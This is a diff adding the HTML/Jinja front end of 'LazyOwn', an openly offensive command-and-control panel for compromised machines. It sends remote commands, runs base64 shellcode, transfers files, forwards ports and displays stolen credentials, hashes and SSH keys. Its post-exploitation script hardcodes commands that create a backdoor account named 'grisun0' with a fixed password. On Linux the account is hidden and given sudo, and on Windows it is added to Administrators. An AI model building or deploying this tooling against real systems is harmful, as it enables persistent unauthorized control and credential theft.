@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LazyOwn Command and Control Center</title>
+    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://unpkg.com/vis-network/styles/vis-network.min.css" rel="stylesheet" type="text/css" />
+    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-beta.1/dist/css/select2.min.css" rel="stylesheet" />
+    <style>
+        .neon-text {
+            color: #00ff00;
+            text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 40px #00ff00;
+            animation: flicker 1.5s infinite alternate;
+        }
+        #mynetwork {
+            width: 100%;
+            height: 768px;
+            border: 1px dotted lightgray;
+        }
+        .section {
+            display: none;
+        }
+        .section.active {
+            display: block;
+        }   
+        /* styles.css */
+        .terminal-window {
+            background-color: #000;
+            color: #0F0;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 20px;
+            border: 2px solid rgb(94, 24, 0);
+            border-radius: 5px;
+            position: relative;
+            word-break: break-all;
+        }
+
+        .terminal-header {
+            background-color: #000;
+            color: #0F0;
+            padding: 5px 10px;
+            border-bottom: 2px solid #0F0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .terminal-title {
+            font-weight: bold;
+        }
+
+        .terminal-controls {
+            display: flex;
+            gap: 5px;
+        }
+
+        .terminal-control-button {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .close-button {
+            background-color: #FF0000;
+        }
+
+        .minimize-button {
+            background-color: #FFFF00;
+        }
+
+        .maximize-button {
+            background-color: #00FF00;
+        }
+
+        .card-text {
+            color: #0F0;
+            white-space: pre-wrap;
+        }
+        .chico {
+            font-size: 12px;
+        }
+        .toastr {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1050;
+            width: 300px;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        .toastr.show {
+            opacity: 1;
+        }        
+        .custom-dropdown {
+            background-color: #f8f9fa;
+            border: 1px solid #ced4da;
+            border-radius: 0.25rem;
+        }              
+    </style>
+</head>
+<body class="bg-dark text-success">
+    <div class="container mt-5">
+        <div class="text-center mb-4">
+            <h1 class="neon-text">LazyOwn Command and Control Center [;,;]</h1>
+            <pre class="neon-text chico">
+                    .-==++++=-:.                                      
+                .=*%@@@@@@@@@@@@@@%+-                                  
+              =%@@%@@@@@@@@@@@@@@@%#%@#-                               
+           .*@@**%@@@@@@@@@@@@@@==#@@@@@@=                             
+          +@@*+@@@@@@@@@@@@@@@%:%@@@@@@@@@@-                           
+         %@@*+@@@@@@@@@@@@@@@@=%@@@@@@@@@@@@:                          
+        +@@@*@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@%*                          
+        *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*%                          
+        +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=@                          
+        :@@@@@@@@@@@@@@@@@@@@@+@@@@@@@@@@@@:@                          
+         #@#@@@@@@@@@@@@@@#**+-=@%@@@@@@@#@:@                          
+       :%%@@%@@@@@@@@%@@@%@@@@@*:#@@@@@@@+#=#                          
+       =:.:#@@%+@@+*%@@@*-.  .=%@=%@@@@@@@=@+                          
+        +%  :%@%%**@@%=       *%@-#@@@@@@@@@:                          
+        .@:   ::+#**=         %@*%+*#%@@%@@+                           
+        %**==+#*:@%#=-:      +@*@@@@@@@#**:                            
+       -@@@@@%%=:=@@@@@@@%#%%@#%@@#*=:==                               
+         .-:=#+   .=%%@@%%#@@@@@#+=.-*                                 
+             =@# -%%@@@@%++#=**==- =@+                                 
+              #@@@@@@@@@@@#%:++=*%:%@@                                 
+             -*=+#+##**#+==.  ==*@@#@+                                 
+               :=#=--::.    *=#@%@%=                                   
+                :+#-      :%##@@@#.                                    
+                 ===     =%+#@@@=                                      
+                  :--::+#*=%@%@:                                       
+                   *###*#%%#*%.                                        
+:======-.                   
+██▓    ▄▄▄      ▒███████▒▓██   ██▓ ▒█████   █     █░███▄    █     ▄████▄   ▄████▄   ▄████▄  
+▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██▒  ██▒▓█░ █ ░█░██ ▀█   █    ▒██▀ ▀█  ▒██▀ ▀█  ▒██▀ ▀█  
+▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒   ▒▓█    ▄ ▒▓█    ▄ ▒▓█    ▄ 
+▒██░   ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒   ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒
+░██████▒▓█   ▓██▒▒███████▒  ░ ██▒▓░░ ████▓▒░░░██▒██▓▒██░   ▓██░   ▒ ▓███▀ ░▒ ▓███▀ ░▒ ▓███▀ ░
+░ ▒░▓  ░▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒    ░ ░▒ ▒  ░░ ░▒ ▒  ░░ ░▒ ▒  ░
+░ ░ ▒  ░ ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░     ░  ▒     ░  ▒     ░  ▒   
+  ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░  ░ ░ ░ ▒    ░   ░    ░   ░ ░    ░        ░        ░        
+    ░  ░     ░  ░  ░ ░     ░ ░         ░ ░      ░            ░    ░ ░      ░ ░      ░ ░      
+                 ░         ░ ░                                    ░        ░        ░                    
+    </pre>
+   
+        </div>
+        <div class="card bg-secondary text-light p-4 mb-4">
+            <p>
+                Disclaimer: [!] Please do not use this in military or secret service organizations, or for illegal purposes. (This is non-binding, as these entities often disregard laws and ethics anyway.)
+            </p>
+            <h2>Connected Clients</h2>
+            <ul class="list-group">
+                {% for client_id in connected_clients %}
+                    <li class="list-group-item list-group-item-success">{{ client_id }}</li>
+                {% endfor %}
+            </ul>
+            <div id="mynetwork"></div>
+            <h2 class="mt-4">Results</h2>
+                {% for client_id, result in results.items() %}
+                <div class="card bg-dark text-light mb-3">
+                    <div class="terminal-window">
+                        <div class="terminal-header">
+                            <div class="terminal-title">Client: {{ client_id }} OS: {{ result.client }}</div>
+                            <input type="hidden" name="{{ client_id }}" id="{{ client_id }}" value="{{ result.client }}">
+                            <div class="terminal-controls">
+                                <div class="terminal-control-button close-button"></div>
+                                <div class="terminal-control-button minimize-button"></div>
+                                <div class="terminal-control-button maximize-button"></div>
+                            </div>
+                        </div>
+                        <div class="card-body">
+                            <pre class="card-text neon-text">{{ result.output }}</pre>
+                        </div>
+                    </div>
+                </div>
+            {% endfor %}         
+            <nav class="navbar navbar-expand-lg navbar-dark bg-secondary">
+                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarNav">
+                    <ul class="navbar-nav">
+                        <li class="nav-item">
+                            <a class="nav-link active" href="#" data-target="command-issue">Command Issue</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" data-target="download-file">Upload File</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" data-target="run-shellcode">Run Shellcode</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" data-target="port-forward">Port Forward</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" data-target="local-shell">Local Shell</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" data-target="session-data">Session Data</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" data-target="upload-file">Download File</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" data-target="atomic-test">Atomic RedTeam Test</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#" data-target="post-exploit">Post Exploitation</a>
+                        </li>
+                    </ul>
+                </div>
+            </nav>            
+            <div id="command-issue" class="section active">
+                <h2>Issue Command</h2>
+                <form action="{{ url_for('issue_command') }}" method="POST">
+                    <div class="form-group">
+                        <label for="client_id">Client ID:</label>
+                        <select id="client_id" name="client_id" class="form-control" required>
+                            {% if connected_clients %}
+                                {% for client_id in connected_clients %}
+                                    <option value="{{ client_id }}">{{ client_id }}</option>
+                                {% endfor %}
+                            {% else %}
+                                <option value="" disabled>No clients available</option>
+                            {% endif %}
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="command">Command:</label>
+                        <input type="text" id="command" name="command" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Send Command</button>
+                </form>
+            </div>
+    
+            <div id="download-file" class="section">
+                <h2>Upload File</h2>
+                <form method="POST" action="{{ url_for('download_file') }}" enctype="multipart/form-data">
+                    <div class="form-group">
+                        <label for="client_id">Client ID:</label>
+                        <select id="client_id" name="client_id" class="form-control" required>
+                            {% if connected_clients %}
+                                {% for client_id in connected_clients %}
+                                    <option value="{{ client_id }}">{{ client_id }}</option>
+                                {% endfor %}
+                            {% else %}
+                                <option value="" disabled>No clients available</option>
+                            {% endif %}
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="file">Select File:</label>
+                        <input type="file" id="file" name="file" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Upload File</button>
+                </form>
+            </div>
+    
+            <div id="run-shellcode" class="section">
+                <h2>Run Shellcode</h2>
+                <form method="POST" action="{{ url_for('run_shellcode') }}">
+                    <div class="form-group">
+                        <label for="client_id">Client ID:</label>
+                        <select id="client_id" name="client_id" class="form-control" required>
+                            {% if connected_clients %}
+                                {% for client_id in connected_clients %}
+                                    <option value="{{ client_id }}">{{ client_id }}</option>
+                                {% endfor %}
+                            {% else %}
+                                <option value="" disabled>No clients available</option>
+                            {% endif %}
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="shellcode">Shellcode: (Opcode Base64 encoded)</label>
+                        <textarea id="shellcode" name="shellcode" rows="10" class="form-control" required></textarea>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Run Shellcode</button>
+                </form>
+            </div>
+    
+            <div id="port-forward" class="section">
+                <h2>Port Forward</h2>
+                <form method="POST" action="/start_bridge">
+                    <div class="form-group">
+                        <label for="local_port">Local Port:</label>
+                        <input type="text" name="local_port" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="remote_host">Remote Host:</label>
+                        <input type="text" name="remote_host" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="remote_port">Remote Port:</label>
+                        <input type="text" name="remote_port" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Start Bridge</button>
+                </form>
+            </div>
+    
+            <div id="local-shell" class="section">
+                <h1>Local Shell</h1>
+                <form id="commandForm">
+                    <div class="form-group">
+                        <label for="attack">Send command to LazyOwn:</label>
+                        <input type="text" id="attack" placeholder="Enter command" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Run</button>
+                </form>
+                <div id="output"></div>
+            </div>
+    
+            <div id="session-data" class="section">
+                <h1 class="text-center">Session Data</h1>
+                <div id="accordion">
+                    <div class="card">
+                        <div class="card-header" id="headingParams">
+                            <h5 class="mb-0">
+                                <button class="btn btn-link" data-toggle="collapse" data-target="#collapseParams" aria-controls="collapseParams">
+                                    Params
+                                </button>
+                            </h5>
+                        </div>
+                        <div id="collapseParams" class="collapse show" aria-labelledby="headingParams" data-parent="#accordion">
+                            <div class="card-body">
+                                <pre>{{ session_data.params | tojson(indent=4) }}</pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header" id="headingCredentials">
+                            <h5 class="mb-0">
+                                <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseCredentials" aria-expanded="false" aria-controls="collapseCredentials">
+                                    Credentials
+                                </button>
+                            </h5>
+                        </div>
+                        <div id="collapseCredentials" class="collapse" aria-labelledby="headingCredentials" data-parent="#accordion">
+                            <div class="card-body">
+                                <pre>{{ session_data.credentials | tojson(indent=4) }}</pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header" id="headingHashes">
+                            <h5 class="mb-0">
+                                <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseHashes" aria-expanded="false" aria-controls="collapseHashes">
+                                    Hashes
+                                </button>
+                            </h5>
+                        </div>
+                        <div id="collapseHashes" class="collapse" aria-labelledby="headingHashes" data-parent="#accordion">
+                            <div class="card-body">
+                                <pre>{{ session_data.hashes | tojson(indent=4) }}</pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header" id="headingNotes">
+                            <h5 class="mb-0">
+                                <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseNotes" aria-expanded="false" aria-controls="collapseNotes">
+                                    Notes
+                                </button>
+                            </h5>
+                        </div>
+                        <div id="collapseNotes" class="collapse" aria-labelledby="headingNotes" data-parent="#accordion">
+                            <div class="card-body">
+                                <pre>{{ session_data.notes | tojson(indent=4) }}</pre>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header" id="headingIdrsa">
+                            <h5 class="mb-0">
+                                <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseIdrsa" aria-expanded="false" aria-controls="collapseIdrsa">
+                                    Idrsa
+                                </button>
+                            </h5>
+                        </div>
+                        <div id="collapseIdrsa" class="collapse" aria-labelledby="headingIdrsa" data-parent="#accordion">
+                            <div class="card-body">
+                                <pre>{{ session_data.id_rsa | tojson(indent=4) }}</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="upload-file" class="section">
+                <h2>Download File</h2>
+                <form id="upload-file-form" method="POST" action="{{ url_for('issue_command') }}" enctype="multipart/form-data">
+                    <div class="form-group">
+                        <label for="client_id">Client ID:</label>
+                        <select id="client_id" name="client_id" class="form-control" required>
+                            {% if connected_clients %}
+                                {% for client_id in connected_clients %}
+                                    <option value="{{ client_id }}">{{ client_id }}</option>
+                                {% endfor %}
+                            {% else %}
+                                <option value="" disabled>No clients available</option>
+                            {% endif %}
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="file_path">File Path:</label>
+                        <input type="text" id="file_path" name="file_path" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Download File</button>
+                </form>
+            </div>
+            <div id="atomic-test" class="section">
+                <h2>Atomic RedTeam Tactics.</h2>
+                <form action="{{ url_for('view_yaml') }}" method="post">
+                    <div class="form-group">
+                        <label for="directory">Select Tactic:</label>
+                        <select name="directory" id="directory" class="form-control" >
+                            {% for directory in directories %}
+                                <option value="{{ directory }}">{{ directory }}</option>
+                            {% endfor %}
+                        </select>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Ver YAML</button>
+                </form>
+            </div>
+            <div id="post-exploit" class="section">
+                <h2>Post-Exploitation</h2>
+                <form id="post-exploit-form" method="POST">
+                    <div class="form-group">
+                        <label for="client_id">Client ID:</label>
+                        <select id="client_id" name="client_id" class="form-control" required>
+                            {% if connected_clients %}
+                                {% for client_id in connected_clients %}
+                                    <option value="{{ client_id }}">{{ client_id }}</option>
+                                {% endfor %}
+                            {% else %}
+                                <option value="" disabled>No clients available</option>
+                            {% endif %}
+                        </select>
+                    </div>
+                    <button id="grisun0" type="submit" class="btn btn-primary">Create User</button>
+                </form>
+            </div>
+            <h2 class="mt-4">Contact</h2>
+            <p>For any questions or feedback, please reach out to <a href="mailto\:grisiscomeback[at]gmail[dot]com" class="text-success">Gris Iscomeback</a>.</p>
+        </div>
+        <div class="footer text-center mt-4 p-3 bg-secondary text-light">
+            <p>&copy; 2024 LazyOwn Web\$hellz. All rights GPLv3.</p>
+        </div>
+        <div id="toastr" class="toastr alert alert-success" role="alert">
+            Command exec successfully.
+        </div>
+        <!-- Google tag (gtag.js) -->
+        <script async src="https://www.googletagmanager.com/gtag/js?id=G-T4VF6JJ095"></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments);}
+            gtag('js', new Date());
+    
+            gtag('config', 'G-T4VF6JJ095');
+        </script>
+        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+        <script src='https://storage.ko-fi.com/cdn/scripts/overlay-widget.js'></script>
+        <script src="https://unpkg.com/vis-network/standalone/umd/vis-network.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-beta.1/dist/js/select2.min.js"></script>
+        <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                $(document).ready(function() {
+                    $('#directory').select2({
+                        placeholder: 'Select a tactic',
+                        allowClear: true,
+                        dropdownCssClass: 'custom-dropdown',
+                        theme: 'default'
+                    });
+                });
+                kofiWidgetOverlay.draw('grisuno', {
+                    'type': 'floating-chat',
+                    'floating-chat.donateButton.text': 'Support me',
+                    'floating-chat.donateButton.background-color': '#5cb85c',
+                    'floating-chat.donateButton.text-color': '#fff'
+                });
+                function toastr(command){
+                    var toastr = document.getElementById('toastr');
+                    toastr.classList.add('show');
+                    setTimeout(function() {
+                        toastr.classList.remove('show');
+                    }, 22000);
+                    toastr.innerHTML += "<div class='.neon-text'> " + command + " </div>"
+                };
+                function RunCmd(command){
+                    console.log(command)
+                    fetch('/api/run', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ command })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        const outputDiv = document.getElementById('output');
+                        if (data.error) {
+                            outputDiv.innerHTML += `<p style="color: red;">${data.error}</p>`;
+                        } else {
+                            toastr(command)
+                        }
+                    });                
+                }   
+                function RunRemoteCmd(client_id, command){
+                    const clientId = client_id;
+                    const formData = new FormData();
+                    formData.append('client_id', clientId);
+                    formData.append('command', command);
+                    const username = '{{ username }}';
+                    const password = '{{ password }}';
+                    const credentials = btoa(`${username}:${password}`);
+                    fetch('/issue_command', {
+                        method: 'POST',
+                        body: formData,
+                        headers: {
+                            'Authorization': `Basic ${credentials}`
+                        }
+                    })
+                    .then(data => {
+                        if (data.error) {
+                            console.log(`Error: ${data.error}`);
+                        } else {
+                            toastr(command)
+                        }
+                    })
+                    .catch(error => {
+                        console.log(`Error: ${error}`);
+                    });                    
+                }
+                document.getElementById('post-exploit-form').addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    const clientId = document.getElementById('client_id').value;
+                    os = document.getElementById(clientId).value;
+                    if(os === "Linux"){
+                        command = "useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0"
+                    }
+                    if(os === "Windows"){
+                        command = "powershell $userExists = Get-LocalUser -Name 'grisun0' -ErrorAction SilentlyContinue; if ($userExists) { Write-Output 'User grisun0 already exists.' } else { $password = 'Grisgrisgris123!'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; New-LocalUser -Name 'grisun0' -Password $securePassword -FullName 'Grisun0 User' -Description 'Grisun0 User'; }; $group = Get-LocalGroup -Name 'Administrators' -ErrorAction SilentlyContinue; if ($group) { Add-LocalGroupMember -Group 'Administrators' -Member 'grisun0' } else { Write-Output 'Group Administrators was not found.' }; Start-Process powershell -Verb runAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `\"Start-Process cmd.exe -Verb runAs -ArgumentList \"/C runas /user:grisun0 cmd.exe\"`\"' ; net localgroup administrators grisun0 /add"
+                    }
+                    RunRemoteCmd(clientId,command);
+                });
+                document.getElementById('upload-file-form').addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    const clientId = document.getElementById('client_id').value;
+                    const filePath = document.getElementById('file_path').value;
+
+                    const formData = new FormData();
+                    formData.append('client_id', clientId);
+                    formData.append('command', `upload:${filePath}`);
+
+                    // Reemplaza 'username' y 'password' con las credenciales reales
+                    const username = '{{ username }}';
+                    const password = '{{ password }}';
+                    const credentials = btoa(`${username}:${password}`);
+
+                    fetch('/issue_command', {
+                        method: 'POST',
+                        body: formData,
+                        headers: {
+                            'Authorization': `Basic ${credentials}`
+                        }
+                    })
+                    .then(data => {
+                        if (data.error) {
+                            console.log(`Error: ${data.error}`);
+                        } else {
+                            command = "Upload File Successfully."
+                            toastr(command)
+                        }
+                    })
+                    .catch(error => {
+                        console.log(`Error: ${error}`);
+                    });
+                });
+                document.getElementById('commandForm').addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    command = document.getElementById('attack').value;
+                    RunCmd(command)
+                });
+
+                function generateGraph(connectedClients) {
+                    var nodes = new vis.DataSet([
+                        {id: 'c2', label: 'C&C LazyOwn', shape: 'image', image: '/static/c2.png', size: 100, font: { color: '#ffffff' }}
+                    ]);
+
+                    var edges = new vis.DataSet();
+
+                    var connectedClients = {{ connected_clients | tojson }};
+                    var results = {{ results | tojson }};
+
+                    connectedClients.forEach(function(client) {
+                        var label = client;
+                        var image = '/static/client.png';
+                        if (results[client] && results[client].client) {
+                            label += " (OS/" + results[client].client + ")";
+                            if (results[client].client === 'Linux') {
+                                image = '/static/Linux.png';
+                            } else if (results[client].client === 'Windows') {
+                                image = '/static/Windows.png';
+                            }
+                        }
+
+                        nodes.add({id: client, label: label, shape: 'image', image: image, size: 70, font: { color: '#ffffff' }});
+                        edges.add({from: 'c2', to: client});
+                    });
+
+                    var container = document.getElementById('mynetwork');
+                    var data = {
+                        nodes: nodes,
+                        edges: edges
+                    };
+                    var options = {
+                        nodes: {
+                            shape: 'image',
+                            size: 70,
+                            color: '#5cb85c',
+                            borderWidth: 2,
+                            borderWidthSelected: 4,
+                            shadow: true,
+                            font: {
+                                size: 16,
+                                face: 'Arial',
+                                color: '#f8f9fa',
+                                background: '#6c757d'
+                            }
+                        },
+                        edges: {
+                            width: 2,
+                            color: '#5cb85c',
+                            arrows: {
+                                to: {enabled: true, scaleFactor: 1},
+                                from: {enabled: false},
+                                middle: {enabled: false}
+                            },
+                            dashes: false,
+                            smooth: true
+                        },
+                        physics: {
+                            forceAtlas2Based: {
+                                gravitationalConstant: -50,
+                                centralGravity: 0.01,
+                                springLength: 400,
+                                springConstant: 0.18,
+                                damping: 0.4
+                            },
+                            maxVelocity: 146,
+                            solver: 'repulsion',
+                            timestep: 0.22,
+                            stabilization: {iterations: 150}
+                        }
+                    };
+                    var network = new vis.Network(container, data, options);
+                    network.on("selectNode", function(params) {
+                    if (params.nodes.length > 0) {
+                        var selectedNodeId = params.nodes[0];
+                        console.log("Nodo seleccionado: " + selectedNodeId);
+
+
+                        var selectElements = document.querySelectorAll('select');
+
+
+                        selectElements.forEach(function(selectElement) {
+
+                            Array.from(selectElement.options).forEach(function(option) {
+
+                                if (option.value === selectedNodeId) {
+
+                                    selectElement.value = selectedNodeId;
+                                }
+                            });
+                        });
+                    }
+                });
+                }
+
+
+                var connectedClients = {{ connected_clients | tojson }};
+                generateGraph(connectedClients);
+    
+
+                document.querySelectorAll('.nav-link').forEach(link => {
+                    link.addEventListener('click', function(event) {
+                        event.preventDefault();
+                        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+                        link.classList.add('active');
+                        document.querySelectorAll('.section').forEach(section => section.classList.remove('active'));
+                        document.getElementById(link.getAttribute('data-target')).classList.add('active');
+                    });
+                });
+            });
+
+
+
+
+    </script>        
+    </body>
+    </html>
